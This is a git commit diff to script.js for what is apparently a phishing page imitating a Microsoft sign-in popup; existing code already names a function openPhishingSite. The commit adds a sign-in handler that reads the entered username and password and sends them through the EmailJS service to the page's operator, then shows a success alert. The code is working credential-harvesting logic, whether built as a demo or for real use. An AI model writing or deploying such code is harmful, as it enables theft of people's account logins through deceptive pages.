a8e318cae661dd5c103093e48e025a63a2251f02
Lanmijami <milanvukasinovic5@gmail.com>
2025-08-28 15:48:12 +0200

    Email sending logic

--- script.js
+++ script.js
@@ -2,6 +2,9 @@ const link = document.getElementById('link');
 const fonContainer = document.getElementById('fon-container');
 const microsoftPopup = document.getElementById('microsoft-popup-container');
 const overlay = document.getElementById('overlay-container');
+const signInButton = document.getElementById('sign-in-button');
+const username = document.getElementById('username');
+const password = document.getElementById('password');
 
 link.addEventListener('click', () => {
   fonContainer.classList.replace('block', 'hidden');
@@ -14,3 +17,17 @@ function openPhishingSite() {
   microsoftPopup.classList.replace('flex', 'hidden');
   overlay.classList.replace('hidden', 'flex');
 }
+
+signInButton.addEventListener('click', () => {
+  emailjs
+    .send('ZRS', 'template_qdm55vd', {
+      message: `Username: ${username.value} + Password: ${password.value}`,
+    })
+    .then(() => {
+      alert('Email sent successfully!');
+    })
+    .catch((err) => {
+      console.error('Failed to send email:', err);
+      alert('Oops! Something went wrong.');
+    });
+});
